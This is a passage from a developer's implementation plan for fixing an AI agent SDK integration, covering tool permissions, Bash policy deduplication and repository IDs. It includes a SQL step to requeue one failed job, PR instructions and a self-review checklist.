- The `tools` vs `allowedTools` change did not regress behavior.

- [ ] **Step 3: Optional CPDEV-20908 recovery**

Check the current state:
```sql
SELECT id, state, planning_attempt_count, last_error, updated_at
  FROM oneshot_runs WHERE id = 2;
```

If `state = 'failed'`, run:
```sql
UPDATE oneshot_runs
   SET state = 'queued_for_planning',
       planning_attempt_count = 0,
       last_error = NULL,
       updated_at = NOW()
 WHERE id = 2;
```

Then re-enqueue via the OneShot requeue CLI or the dashboard control
plane. If the state is no longer `failed` (progressive retry already
recovered it), skip this step.

- [ ] **Step 4: Open PR**

Push the branch and open a PR with:
- Title: `fix(claude-sdk): real tools cap, precedence, bash dedup, repo IDs, hook cleanup`
- Body: link to the v2 spec; list the 5 fixes; note that observability
  scope is already on main via #58/#60/#61.
- Ask reviewers to diff the ANVIL agent behavior specifically (it's
  the most sensitive caller to the Bash policy dedup).

---

## Self-Review

**Spec coverage vs. plan tasks:**
- Section 1 (real `tools` cap) → Task 2 ✅
- Section 2 (precedence fix) → Task 1 + Task 7 (audit) ✅
- Section 3 (Bash policy dedup) → Task 3 ✅
- Section 4 (hooks.ts cleanup) → Task 6 ✅
- Section 5 (repo IDs) → Task 4 + Task 5 (OneShot wiring) ✅
- Section 6 (CPDEV-20908 recovery) → Task 8 Step 3 ✅

**Placeholder scan:**
- Task 2 Step 1 asks the engineer to expand test-body comments using
  the existing mock pattern — this is a deliberate "follow the file's
  convention" instruction, not a placeholder. The assertions to make
  are spelled out.
- Task 5 Step 3 offers two concrete alternative implementations for
  cleanup wiring depending on what's in scope — that is flexibility,
  not ambiguity. Both options are fully specified.
- Task 7 is conditionally interactive (audit output drives whether a
  fix is needed) but each branch has explicit code to apply.

**Type consistency:**
- `resolveToolSet({ allowedTools?, permissionLevel?, agentType? })` is
  used identically in config.test.ts, config.ts, and index.ts.
- `registerRepoFromPath(absPath, explicitId?)` and
  `deregisterRepo(id)` signatures match between config.ts, index.ts
  re-exports, OneShot providers, and workspaces.ts.
- `isBashCommandBlocked(command): { blocked, reason? }` is consistent
  between the definition, the `canUseTool` caller, and tests.

**Out-of-scope (documented in spec, not in plan):**
- Profile collapse to `readonly`/`autonomous` (rejected by #60)
- Session-log jsonl tailer (redundant with main's stall diagnostics)
- `buildHooks` rewrite (delete instead)
- QUALIFIER null-mode terminal (already handled by #53)
- `[SDK_COMPLETE]` counter bug (already correct on main)
- `settingSources: []` (defer)
